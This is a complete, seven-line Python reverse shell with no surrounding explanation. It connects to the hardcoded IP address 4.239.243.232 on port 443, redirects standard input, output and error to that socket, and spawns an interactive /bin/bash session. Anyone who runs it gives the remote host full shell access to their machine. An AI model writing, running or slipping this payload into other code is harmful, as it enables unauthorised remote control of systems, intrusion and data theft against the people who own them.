import socket, os, pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("4.239.243.232",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
